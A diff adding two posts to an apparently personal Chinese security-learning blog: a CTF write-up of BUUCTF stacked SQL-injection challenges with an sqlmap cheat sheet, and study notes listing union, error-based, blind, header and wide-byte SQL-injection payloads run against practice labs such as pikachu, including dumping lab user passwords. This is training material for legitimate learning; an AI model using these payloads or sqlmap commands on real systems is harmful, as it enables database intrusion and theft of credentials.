@@ -148,6 +148,247 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-3-25-wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/28/3-25-wp/">3.25 wp</a>
+    </h1>
+  
+
+        
+        <a href="/2022/03/28/3-25-wp/" class="archive-article-date">
+  	<time datetime="2022-03-28T11:17:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="3-25-wp"><a href="#3-25-wp" class="headerlink" title="3.25 wp"></a>3.25 wp</h1><h3 id="buuctf-2019-easysql"><a href="#buuctf-2019-easysql" class="headerlink" title="buuctf 2019 easysql"></a><strong>buuctf 2019 easysql</strong></h3><p><strong>输入1，回显</strong></p>
+<p><strong><img src="/.com//image-20220326154714237.png" alt="image-20220326154714237"></strong></p>
+<p><strong>输入1‘，无回显</strong></p>
+<p><strong>输入1‘ order by 1#                                  nonono</strong></p>
+<p><strong>输入1 and length(database())&gt;&#x3D;1#       nonono</strong></p>
+<p><strong>输入1’ and sleep(5) #                              nonono</strong></p>
+<p><strong>过滤了很多</strong></p>
+<p><strong>———– 参考大佬博客</strong></p>
+<p><strong>尝试堆叠注入</strong></p>
+<ol>
+<li><strong>1;show databases;#</strong></li>
+</ol>
+<p><strong>没有nonono</strong></p>
+<p><strong><img src="/.com//image-20220326155126987.png" alt="image-20220326155126987"></strong></p>
+<ol start="2">
+<li><strong>1;show tables;#  表</strong></li>
+</ol>
+<p><strong><img src="/.com//image-20220326155241139.png" alt="image-20220326155241139"></strong></p>
+<ol start="3">
+<li><strong>1;show columns from Flag;#</strong></li>
+</ol>
+<p><strong>结果又是nonono</strong></p>
+<p><strong>~~大佬blog：</strong></p>
+<p><strong>这道题目需要我们去对后端语句进行猜测</strong></p>
+<p><strong>1、输入非零数字得到的回显1和输入其余字符得不到回显&#x3D;&gt;来判断出内部的查询语句可能存在有||</strong></p>
+<p><strong>2、也就是select 输入的数据||内置的一个列名 from 表名&#x3D;&gt;即为</strong></p>
+<pre><code>select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)
+</code></pre>
+<p><strong>此时的||起到的作用是or的作用</strong></p>
+<p><strong>解法1</strong><br><strong>内置的sql语句为</strong></p>
+<p><strong>sql&#x3D;“select”.post[‘query’].”||flag from Flag”;</strong></p>
+<p><em><em>如果$post[‘query’]的数据为</em>,1，sql语句就变成了</em>*</p>
+<p>*<em>select <em>,1||flag from Flag</em></em></p>
+<p><strong>也就是</strong></p>
+<p>*<em>select <em>,1 from Flag</em></em></p>
+<p><strong>也就是直接查询出了Flag表中的所有内容</strong></p>
+<p><strong><img src="/.com//image-20220326160747096.png" alt="image-20220326160747096"></strong></p>
+<p><strong>解法2</strong><br> <strong>输入的内容为</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="built_in">set</span> sql_mode=pipes_as_concat;select 1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>我们执行的语句分别为</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select 1</span><br><span class="line"><span class="built_in">set</span> sql_mode=pipes_as_concat</span><br><span class="line">select 1||flag from Flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>启用PIPES_AS_CONCAT SQL模式后，|| 用作<code>CONCAT()</code>函数的同义词，即字符串串联函数。</strong></p>
+<p><strong>读出flag</strong></p>
+<p><strong><img src="/.com//20200430180147681.png" alt="在这里插入图片描述"></strong></p>
+<p>最后的不是很懂，<strong>好难</strong></p>
+<p><strong>版权声明：本文为CSDN博主「一只小白来了」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</strong><br><strong>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44866139/article/details/105857487">https://blog.csdn.net/weixin_44866139/article/details/105857487</a></strong></p>
+<h4 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h4><p>输入1‘报错</p>
+<p>1’#正常</p>
+<p>存在注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>正常回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1 #</span><br></pre></td></tr></table></figure>
+
+<p>正常</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2 #</span><br></pre></td></tr></table></figure>
+
+<p>正常</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
+
+<p>报错</p>
+<p>说明有2列</p>
+<p>-1 union select 1,2</p>
+<p><img src="/.com//image-20220326163747524.png" alt="image-20220326163747524"></p>
+<p>过滤了 select，update，delete，drop，insert，where 和 .</p>
+<p>联合注入不能用</p>
+<p>考虑上一题的堆叠</p>
+<p><img src="/.com//image-20220326163932232.png" alt="image-20220326163932232"></p>
+<p>有了</p>
+<p>查看表</p>
+<p>1’;show tables;#</p>
+<p><img src="/.com//image-20220326164025900.png" alt="image-20220326164025900"></p>
+<p>两个表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show columns from `words`; #</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20220326164155676.png" alt="image-20220326164155676"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514`; #</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20220326164307289.png" alt="image-20220326164307289"></p>
+<p>问大佬</p>
+<p>有两张表，回显内容是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢<br>内部查询语句类似 :<code>select id, data from word where id =</code></p>
+<p>他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。<br> 先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。<br> <strong>payload:</strong><br>0’;rename table words to words1;rename table <code>1919810931114514</code> to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</p>
+<p>再输入1’ or ‘1’&#x3D;’1 #就可以了</p>
+<p><img src="/.com//image-20220326165043026.png" alt="image-20220326165043026"></p>
+<p>大佬提示：</p>
+<p><strong>坑点：mysql中点引号( ‘ )和反勾号( &#96; )的区别</strong></p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">linux下不区分，windows下区分</span><br><span class="line">区别:</span><br><span class="line">单引号( &#x27; )或双引号主要用于字符串的引用符号</span><br><span class="line">eg：mysql&gt; SELECT <span class="symbol">&#x27;hello</span>&#x27;, <span class="string">&quot;hello&quot;</span> ;</span><br><span class="line"></span><br><span class="line">反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]</span><br><span class="line">eg:`mysql&gt;SELECT * FROM   `table`   WHERE `from` = <span class="symbol">&#x27;abc</span>&#x27; ;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>作者：简简的我<br>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/36f0772f5ce8">https://www.jianshu.com/p/36f0772f5ce8</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>找到的命令</p>
+<p>注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）</p>
+<p>1#、注入六连：</p>
+<ol>
+<li><p>sqlmap -u  “<a target="_blank" rel="noopener" href="http://www.xx.com/?id=x&quot;">http://www.xx.com?id=x&quot;</a>    【查询是否存在注入点</p>
+</li>
+<li><p>–dbs         【检测站点包含哪些数据库</p>
+</li>
+<li><p>–current-db    【获取当前的数据库名</p>
+</li>
+<li><p>–tables -D “db_name”  【获取指定数据库中的表名 -D后接指定的数据库名称</p>
+</li>
+<li><p>–columns  -T “table_name” -D “db_name”  【获取数据库表中的字段</p>
+</li>
+<li><p>–dump -C “columns_name” -T “table_name” -D “db_name”  【获取字段的数据内容</p>
+</li>
+</ol>
+<p>2#、COOKIE注入：<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://www.xx.com/?id=x&quot;">http://www.xx.com?id=x&quot;</a> –cookie “cookie” –level 2  【cookie注入 后接cookie值</p>
+<p>3#、POST注入：<br>（1）目标地址http:&#x2F;&#x2F; <a target="_blank" rel="noopener" href="http://www.xxx.com/">www.xxx.com</a> &#x2F;login.asp<br>（2）打开brup代理。<br>（3）点击表单提交<br>（4）burp获取拦截信息（post）<br>（5）右键保存文件（.txt）到指定目录下<br>（6）运行sqlmap并执行如下命令：<br>用例：sqlmap -r okay.txt  -p  username</p>
+<p>&#x2F;&#x2F; -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p>
+<p>（7）自动获取表单：–forms自动获取表单</p>
+<p>例如：sqlmap -u <a target="_blank" rel="noopener" href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> –forms</p>
+<p>（8）指定参数搜索：–data</p>
+<p>例如:sqlmap -u <a target="_blank" rel="noopener" href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> –data “username&#x3D;1”</p>
+<p>4#、常用指令：</p>
+<ol>
+<li><p>–purge      【重新扫描（–purge 删除原先对该目标扫描的记录）</p>
+</li>
+<li><p>–tables      【获取表名</p>
+</li>
+<li><p>–dbs         【检测站点包含哪些数据库</p>
+</li>
+<li><p>–current-db    【获取当前的数据库名</p>
+</li>
+<li><p>–current-user  【检测当前用户</p>
+</li>
+<li><p>–is-dba   【判断站点的当前用户是否为数据库管理员</p>
+</li>
+<li><p>–batch      【默认确认，不询问你是否输入</p>
+</li>
+<li><p>–search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）</p>
+</li>
+<li><p>–threads 10  【线程，sqlmap线程最高设置为10</p>
+</li>
+<li><p>–level 3        【sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头<br>                       的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5</p>
+</li>
+<li><p>–risk 3           【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</p>
+</li>
+<li><p>-v   【详细的等级(0-6)<br>  0：只显示Python的回溯，错误和关键消息。<br>  1：显示信息和警告消息。<br>  2：显示调试消息。<br>  3：有效载荷注入。<br>  4：显示HTTP请求。<br>  5：显示HTTP响应头。<br>  6：显示HTTP响应页面的内容</p>
+</li>
+<li><p>–privileges  【查看权限</p>
+</li>
+<li><p>–tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件</p>
+</li>
+<li><p>–method “POST” –data “page&#x3D;1&amp;id&#x3D;2”   【POST方式提交数据</p>
+</li>
+<li><p>–threads number　　【采用多线程 后接线程数</p>
+</li>
+<li><p>–referer  “”  【使用referer欺骗</p>
+</li>
+<li><p>–user-agent “”     【自定义user-agent</p>
+</li>
+<li><p>–proxy “目标地址″   【使用代理注入</p>
+</li>
+</ol>
+<p>sqlmap常用路径：</p>
+<ol>
+<li><p>添加表字段的目录在&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;txt&#x2F;common-tables.txt</p>
+</li>
+<li><p>存放扫描记录的目录在&#x2F;root&#x2F;.sqlmap&#x2F;output</p>
+</li>
+</ol>
+<hr>
+<p>版权声明：本文为CSDN博主「OKAY_TC」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37964989">https://blog.csdn.net/qq_37964989</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/28/3-25-wp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-photo-test" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -366,6 +607,197 @@
 
 
   
+    <article id="post-SQL-inject" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</p>
+<h3 id="如何去判断-SQL注入漏洞"><a href="#如何去判断-SQL注入漏洞" class="headerlink" title="如何去判断 SQL注入漏洞"></a><em><strong>如何去判断 SQL注入漏洞</strong></em></h3><ul>
+<li>and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同</li>
+<li>单引号判断 ‘ 显示数据库错误信息或者页面回显不同</li>
+<li>\ (转义符)</li>
+<li>-1&#x2F;+1 回显下一个或上一个页面</li>
+<li>and sleep(5)</li>
+</ul>
+<h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><p>UNION query SQL injection（可联合查询注入）<br>Error-based SQL injection（报错型注入）<br>Boolean-based blind SQL injection（布尔型注入）<br>Time-based blind SQL injection（基于时间延迟注入）<br>Stacked queries SQL injection（可多语句查询注入）</p>
+<p><strong>select * * from member where username&#x3D;’  ‘</strong></p>
+<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><ol>
+<li><p>通过联合查询来查询指定的数据，比如下面的语句</p>
+<p>select 字段1,字段2 from user where id&#x3D;1 union select 字段1,字段2 from 表名</p>
+<p>联合查询的字段数,列需要和主查询一致。</p>
+<p>通过select database(); select user(); select version(); 查询数据库的数据库、用户和版本信息。</p>
+<p> 用 order by 来帮助我们猜测后台查询语句查询的字段数select 字段1,字段2 from users order by 1；后面跟着的数字表示根据查询结果的第几列进行排序，</p>
+</li>
+<li><p>用 order by 确认主查询<strong>有多少个列</strong> 依次输入以下代码在对话框。</p>
+<p><strong>id&#x3D;1‘ order by 1#</strong> (改变order by 后面的1)</p>
+</li>
+<li><p>判断<strong>显示位</strong></p>
+<p><strong>url?id&#x3D;-1 union select 1,2,3,4,5</strong></p>
+</li>
+<li><p>通过’ union select database(),user() # 获得当前<strong>数据库名称和用户</strong>：(在显示位输入database)</p>
+<p><strong>url?id&#x3D;-1’union select 1,2,3,database()</strong></p>
+<p> url?id&#x3D;-1 union select 1,2,databaes(),4,5<br> url?id&#x3D;-1 union select 1,2,user(),4,5</p>
+</li>
+<li><p>列出<strong>所有数据库</strong></p>
+<p>limit 一个一个打印出来库名<br>select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1<br>group_concat 一次性全部显示<br><strong>id &#x3D;-1 union select 1,group_concat(schema_name)from information_schema.schemata</strong></p>
+</li>
+<li><p>获取<strong>表名：</strong><br>limit 一个一个打印出来字段名<br>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;‘test’<br>limit 0,1</p>
+<p>group_concat 一次性全部显示<br>select group_concat(TABLE_NAME) from information_schema.TABLES where<br>TABLE_SCHEMA&#x3D;0x674657374</p>
+</li>
+</ol>
+<p>​       <strong>id&#x3D;-1 union select 1,group_concat(table_name) from information_schema.tables where</strong>      </p>
+<p>​       <strong>table_schema&#x3D;’数据库名’ #</strong></p>
+<ol start="7">
+<li><p><strong>字段</strong></p>
+<p>limit 一个一个打印出来<br>select COLUMN_NAME from information_schema.COLUMNS where<br>TABLE_SCHEMA&#x3D;‘baji’ and TABLE_NAME&#x3D;‘users’ limit 0,1<br>group_concat 一次性全部显示<br><strong>id&#x3D;-1 union select1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where</strong><br><strong>TABLE_SCHEMA&#x3D;……………… and TABLE_NAME&#x3D;………….</strong></p>
+<p>id&#x3D;-1 union select 1,group_concat(表名) from 数据库名.表名</p>
+</li>
+<li><p><strong>列出数据</strong></p>
+<p>limit 一个一个打印出来<br>select username,passwd from test.admin limit 0,1<br>group_concat 把 一次性全部打印<br>select group_concat(concat(username,0x20,passwd)) from test.admin<br>network</p>
+</li>
+<li><p><strong>列数</strong></p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,2,3,4 %23 &amp;pw=123</span><br><span class="line">1 union select 1,flag from ctfhub.flag #</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1**.数据库**</p>
+<p>​     id&#x3D;1 union select updatexml(1,concat(0x7e,database(),0x7e),1);</p>
+<p>2.<strong>表名</strong></p>
+<p>​    id&#x3D;1 union select updatexml(1,concat(0x7e, (select(group_concat(table_name))from     information_schema.tables where table_schema&#x3D;”…”) ,0x7e),1);</p>
+<p>3**.列名**</p>
+<p>​    id&#x3D;1 union select updatexml(1,concat(0x7e, (select(group_concat(column_name))from information_schema.columns where table_name&#x3D;”…”) ,0x7e),1);</p>
+<p>4.<strong>内容</strong></p>
+<p>   id&#x3D;1 union select updatexml(1,concat(0x7e, (select(group_concat(列名)) from 库名.表名) ,0x7e),1);</p>
+<p>​              <em>然而由于回显长度的限制，没有完全返回所有值，使用right函数让后半部分的内容回显出来</em></p>
+<p>​    id&#x3D;1 union select updatexml(1,concat(0x7e, right((select(group_concat(flag)) from sqli.flag) ,31),0x7e),1);</p>
+<h3 id="insert-语句"><a href="#insert-语句" class="headerlink" title="insert 语句"></a>insert 语句</h3><p>是指我们前端注册的信息，后台会通过 insert 这个操作插入到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入</p>
+<p>我们一般可以通过 <strong>or</strong> 进行闭合。猜测一下后端代码可能是<br> insert into member(username,pw,sex,phonenum,email,adderss) values(‘xiaohong’,22);</p>
+<p>1.数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,database()),1) or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>   或   xiaohong’ or updatexml(1, concat(0x7e,database()), 0) or ‘</p>
+<p>2.信息</p>
+<p>​      1’ and updatexml(1,concat(0x7e,（select(concat_ws(0x7e,username,password)） from pikachu.users limit0,1)),1) or ‘1’ &#x3D; ‘1</p>
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>实际上就是传递了一个留言的 <strong>id，</strong>后台根据这个 id 去删除留言，并且我们可以看出来这是一个数字型的，这样我们可以构造的 payload。</p>
+<h6 id="1-or-updatexml-1-concat-0x7e-database-0"><a href="#1-or-updatexml-1-concat-0x7e-database-0" class="headerlink" title="1 or updatexml(1, concat(0x7e,database()), 0)"></a>1 or updatexml(1, concat(0x7e,database()), 0)</h6><p> 因为参数是通过URL提交的，所以要对闭合代码进行URL编码</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><ol>
+<li><p>1’;show databases;#</p>
+</li>
+<li><p>1’;show tables;#</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>1’; show columns from <code>words</code>; #<br>1’; show columns from <code>1919810931114514</code>; #</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   可以看到word表里有id等数据，另一个表里存有flag，我们可以采用把word表改成其他的名字而把另一个表改成word从而爆出flag</span><br><span class="line"></span><br><span class="line">   0&#x27;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span><br><span class="line"></span><br><span class="line">4. 1’or 1=1#，1当然查不到，所以会直接爆出flag</span><br><span class="line"></span><br><span class="line">### 基于extractvalue()</span><br><span class="line"></span><br><span class="line">kobe&#x27; and extractvalue(0,concat(0x7e,version()))#</span><br><span class="line"></span><br><span class="line">### 基于floor()</span><br><span class="line"></span><br><span class="line">kobe&#x27; and (select 2 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kobe&#x27; and (select 2 from  (select count(*),concat((select password from users where username=&#x27;admin&#x27; limit 0,1),floor(rand(0)*2))x from  information_schema.tables group by x)a)#</span><br><span class="line"></span><br><span class="line">### http header注入</span><br><span class="line"></span><br><span class="line">1.把User-Agent的信息修改为单引号，右边的Response会报错，说明存在着一个SQL注入</span><br><span class="line"></span><br><span class="line">2.修改user-agent</span><br><span class="line"></span><br><span class="line">​     	1&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br><span class="line"></span><br><span class="line">  或者cookie完成注入</span><br><span class="line"></span><br><span class="line">​	    1&#x27; and updatexml(1, concat( 0x7e,version()) ,0)#</span><br><span class="line"></span><br><span class="line">### 盲注</span><br><span class="line"></span><br><span class="line">#### boolian</span><br><span class="line"></span><br><span class="line">1. 判断数据库名的长度</span><br><span class="line"></span><br><span class="line">​    	 kobe’and ascii(length(database()))&gt;=**?** #(? 填数字)</span><br><span class="line"></span><br><span class="line">   2.爆破数据库的名字，要一个字母一个字母爆破</span><br><span class="line"></span><br><span class="line">​	  1.  kobe&#x27;  and  ascii(substr(database(),1,1))&gt;？#(改变？)</span><br><span class="line"></span><br><span class="line">​	  2.或者用sqlmap</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  查询数据库名：</p>
+</li>
+</ol>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost/pikachu-master/vul/sqli/sqli_blind_b.php?name=lucy&amp;submit=%E6%9F%A5%E8%AF%A2%E2%80%9D">http://localhost/pikachu-master/vul/sqli/sqli_blind_b.php?name=lucy&amp;submit=%E6%9F%A5%E8%AF%A2”</a> –current-db</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​	  ![](https://note.youdao.com/yws/api/personal/file/WEB2f0300741dc5585534eded037871fd3d?method=download&amp;shareKey=790d7e9db5763e0b9e80438ffc54248d)</span><br><span class="line"></span><br><span class="line">​     爆表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost/pikachu-master/vul/sqli/sqli_blind_b.php?name=lucy&amp;submit=%E6%9F%A5%E8%AF%A2%E2%80%9D">http://localhost/pikachu-master/vul/sqli/sqli_blind_b.php?name=lucy&amp;submit=%E6%9F%A5%E8%AF%A2”</a> -D pikachu –tables</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/api/personal/file/WEBda46fce985eccb68643482ca1e132792?method=download&amp;shareKey=83aa14841450ef316db4acfb80b127d9)</span><br><span class="line"></span><br><span class="line">​	 爆users表的列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost/pikachu-master/vul/sqli/sqli_blind_b.php?name=lucy&amp;submit=%E6%9F%A5%E8%AF%A2%E2%80%9D">http://localhost/pikachu-master/vul/sqli/sqli_blind_b.php?name=lucy&amp;submit=%E6%9F%A5%E8%AF%A2”</a> -D pikachu -T users –columns</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/api/personal/file/WEBd2a75f89bfb4b26751e38a4445d71f04?method=download&amp;shareKey=082f6bce468ab280a22ed2b44d27fdc9)</span><br><span class="line"></span><br><span class="line">爆username 和password的值,获取列字段的内容</span><br><span class="line"></span><br><span class="line"> python sqlmap.py -u &quot;http://localhost/pikachu-master/vul/sqli/sqli_blind_b.php?name=lucy&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --dump -C &quot;username,password&quot; -T &quot;users&quot;</span><br><span class="line"></span><br><span class="line">--dump 打印出来 -C 后接需要获取的字段名 -T为指定的表名</span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/api/personal/file/WEB7dfa0daa3388b2019df5e8b36be644f2?method=download&amp;shareKey=7341a4329cb2c949024b19c8394fb2a3)</span><br><span class="line"></span><br><span class="line"> 没弄完，风扇太吵，强制叫停</span><br><span class="line"></span><br><span class="line">   md5解密 分别为 </span><br><span class="line"></span><br><span class="line">| **pikachu** | 000000 |</span><br><span class="line">| ----------- | ------ |</span><br><span class="line">| admin       | 123456 |</span><br><span class="line">| test        | abc123 |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### time</span><br><span class="line"></span><br><span class="line">  lucy’ and sleep(5) #</span><br><span class="line"></span><br><span class="line">5s页面才返回下面的一句话，说明sleep(5)被执行了，只是没有回显</span><br><span class="line"></span><br><span class="line">1. kobe&#x27; and if((substr(database(),1,1))=&#x27;p&#x27;,sleep(5),null)#</span><br><span class="line"></span><br><span class="line">   将数据库第一个与p比较，true则5s回显</span><br><span class="line"></span><br><span class="line"> 或</span><br><span class="line"></span><br><span class="line">2. sqlmap</span><br><span class="line"></span><br><span class="line">### 宽字节注入</span><br><span class="line"></span><br><span class="line">在单引号前面加&quot; %df &quot;，来让单引号逃过转义</span><br><span class="line"></span><br><span class="line">kobe%df&#x27; or 1=1#</span><br><span class="line"></span><br><span class="line">### 函数</span><br><span class="line"></span><br><span class="line">**updatexml()：** MySQL 对 XML 文档数据进行查询和修改的 XPATH 函数  替换</span><br><span class="line"></span><br></pre></td></tr></table></figure>
